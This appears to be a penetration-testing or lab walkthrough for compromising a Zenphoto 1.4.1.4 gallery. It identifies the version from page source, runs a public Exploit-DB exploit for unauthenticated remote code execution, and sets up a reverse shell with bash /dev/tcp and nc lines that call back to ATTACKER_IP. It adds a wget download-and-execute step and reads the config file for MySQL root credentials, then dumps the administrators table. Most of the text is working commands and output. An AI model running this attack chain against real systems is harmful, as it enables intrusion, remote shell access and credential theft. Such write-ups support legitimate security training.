# Zenphoto

Zenphoto `1.4.1.4` can be vulnerable to unauthenticated remote code execution through the bundled TinyMCE ajax file manager path.

## Discovery

Browse the discovered gallery:

```text
http://TARGET/test/
RSS Feed | Archive View | Powered by zenPHOTO
```

## Version Identification

View source on the gallery home page. The Zenphoto version can appear in an HTML comment:

```text
view-source:http://TARGET/test/
<!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (index.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  -->
```

Searchsploit shows an exact-version RCE:

```text
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution | php/webapps/18083.php
```

Copy the exploit:

```bash
searchsploit -m php/webapps/18083.php
```

## Remote Code Execution

Confirm the vulnerable TinyMCE ajax file manager path exists under the discovered Zenphoto base path:

```text
http://TARGET/test/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php
Permission denied: session/ is not writable.
```

Run the exploit against the target and Zenphoto path:

```bash
php 18083.php TARGET /test/
```

Successful command execution:

```text
zenphoto-shell# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

A Bash/nc stager worked from the Zenphoto exploit shell:

```bash
cat > shell.sh <<'EOF'
#!/bin/bash
sh -i >& /dev/tcp/ATTACKER_IP/80 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 80 >/tmp/f
EOF

python3 -m http.server 8000
```

Download and execute it from the target:

```bash
wget -O /tmp/shell.sh http://ATTACKER_IP:8000/shell.sh
chmod 777 /tmp/shell.sh
/tmp/shell.sh
```

Successful shell:

```text
nc -nlvp 80
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
sh: can't access tty; job control turned off
```

## Zenphoto Database Credentials

From the web root, check `zp-data/zp-config.php`:

```bash
cd /var/www/test
cat ./zp-data/zp-config.php
```

Observed credentials:

```php
$conf['mysql_user'] = 'root';
$conf['mysql_pass'] = 'hola';
$conf['mysql_host'] = 'localhost';
$conf['mysql_database'] = 'zenphoto';
```

Useful database enumeration:

```sql
show databases;
use zenphoto;
show tables;
select * from zp_administrators\G
```

## References

- https://www.exploit-db.com/exploits/18083
